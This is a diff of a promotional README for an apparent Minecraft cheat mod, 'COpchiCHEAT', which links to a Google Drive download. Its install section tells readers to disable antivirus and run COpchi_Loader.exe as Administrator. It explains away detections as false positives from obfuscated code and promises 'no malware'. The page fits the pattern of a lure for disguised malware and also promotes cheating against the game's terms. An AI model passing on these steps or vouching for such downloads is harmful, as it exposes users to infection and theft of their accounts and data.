@@ -1,4 +1,4 @@
-🚀 COpchiCHEAT V11.1 — Undetected Minecraft Utility Mod
+🚀 COpchiCHEAT V11.1 — Undetected Minecraft Utility Mod ![launcher](https://i.postimg.cc/pdMT5L82/1750522223777.png)
 📥 Download (Latest Build): https://drive.google.com/file/d/1yqde-aRw33-G-Zy20w9yz3zyjmL86x3q/view?usp=sharing |
 
 🔥 Features
@@ -13,7 +13,6 @@ diff
 + New in v11.1: Improved Flight & Scaffold!  
 - Removed: Risky features (reduced detection rate).  
 📦 Instation
-![launcher](https://i.postimg.cc/Zbrb2mNN/1750523317452.png)
 Disable antivirus (false positives; why?).
 
 Run COpchi_Loader.exe as Administrator.
@@ -34,7 +33,7 @@ Mojang’s EULA prohibits cheating. We do not condone misuse.
 False positives: Our code is obfuscated, triggering AVs. Virustotal Report.
 
 No malware: Read our transparency policy.
-
+![launcher](https://i.postimg.cc/Zbrb2mNN/1750523317452.png)
 </details>
 🌟 Why Choose COpchiCHEAT?
 Feature	COpchiCHEAT	Competitor X
